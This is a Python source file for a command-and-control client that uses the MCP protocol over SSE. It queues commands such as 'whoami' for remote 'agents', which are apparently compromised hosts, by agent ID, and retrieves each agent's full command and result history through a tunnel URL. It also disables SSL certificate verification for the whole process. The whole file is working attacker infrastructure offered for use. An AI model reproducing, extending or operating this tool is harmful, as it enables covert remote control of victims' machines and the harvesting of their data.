#!/usr/bin/env python3
"""
MCP C2 Client with Full History Support
• Connects to an MCP C2 server over SSE
• Enqueues commands or fetches the agent's full command/result history

Usage:
  Enqueue:
    python client.py --server-url <url> --agent-id <id> --command <cmd> [--args <arg1> <arg2>...]
  History:
    python client.py --server-url <url> --agent-id <id> --history

Dependencies:
  pip install mcp certifi
"""
import argparse
import asyncio
import ssl
import json
import certifi

# Fix Homebrew certifi bug
if not hasattr(certifi, 'where'):
    certifi.where = lambda: ssl.get_default_verify_paths().cafile
# Optionally disable SSL verification (insecure)
ssl._create_default_https_context = ssl._create_unverified_context

from mcp.client.sse import sse_client
from mcp.client.session import ClientSession

async def call_tool_json(client, tool_name, params):
    """
    Calls an MCP tool and returns:
      - A dict or list if parsed successfully
      - A list of parsed JSON objects if multiple SSE events
      - Raw text on non‑JSON payloads
    """
    resp = await client.call_tool(tool_name, {'params': params})

    # 1) If already a dict or list, return directly
    if isinstance(resp, (dict, list)):
        return resp

    # 2) Otherwise, resp.content is a list of SSE chunks
    if hasattr(resp, 'content') and resp.content:
        items = []
        for chunk in resp.content:
            text = chunk.text.strip()
            if not text:
                continue
            try:
                items.append(json.loads(text))
            except json.JSONDecodeError:
                items.append(text)
        # If only one JSON object, return it directly; else return list
        return items if len(items) != 1 else items[0]

    return None

async def enqueue_command(server_url, agent_id, command, args):
    mcp_url = server_url.rstrip('/') + '/mcp'
    print(f"[i] Connecting to {mcp_url}")
    async with sse_client(mcp_url) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as client:
            await client.initialize()
            print(f"[i] Enqueuing '{command}' for agent '{agent_id}'...")
            result = await call_tool_json(
                client,
                'enqueue_command',
                {'agent_id': agent_id, 'command': command, 'args': args}
            )
            if isinstance(result, dict) and result.get('ok'):
                print(f"[+] Command '{command}' enqueued successfully.")
            else:
                print(f"[!] Enqueue failed: {result}")

async def fetch_history(server_url, agent_id):
    mcp_url = server_url.rstrip('/') + '/mcp'
    print(f"[i] Connecting to {mcp_url}")
    async with sse_client(mcp_url) as (read_stream, write_stream):
        async with ClientSession(read_stream, write_stream) as client:
            await client.initialize()
            print(f"[i] Fetching full history for agent '{agent_id}'...")
            history = await call_tool_json(
                client,
                'get_results',
                {'agent_id': agent_id}
            )
            if isinstance(history, list):
                print(f"[+] Full history ({len(history)}) entries for {agent_id}:")
                for idx, entry in enumerate(history, 1):
                    print(f"Entry {idx}:")
                    print(json.dumps(entry, indent=2))
            elif isinstance(history, dict):
                # Single-entry list flattened
                print("[+] Full history (1 entry):")
                print(json.dumps(history, indent=2))
            else:
                print(f"[!] Failed to fetch history: {history}")

async def main():
    parser = argparse.ArgumentParser(description="MCP C2 Client: Enqueue & Full History")
    parser.add_argument("--server-url", required=True,
                        help="Base URL of MCP server (e.g. https://abcd.ngrok.io)")
    parser.add_argument("--agent-id", required=True,
                        help="Agent ID to target")
    parser.add_argument("--command", help="Command to enqueue (e.g. 'whoami')")
    parser.add_argument("--args", nargs='*', default=[],
                        help="Arguments for the command")
    parser.add_argument("--history", action='store_true',
                        help="Fetch full command+result history for the agent")
    args = parser.parse_args()

    if args.history:
        await fetch_history(args.server_url, args.agent_id)
    else:
        if not args.command:
            parser.error("--command is required unless --history is specified")
        await enqueue_command(
            args.server_url,
            args.agent_id,
            args.command,
            args.args
        )

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[i] Client terminated by user")

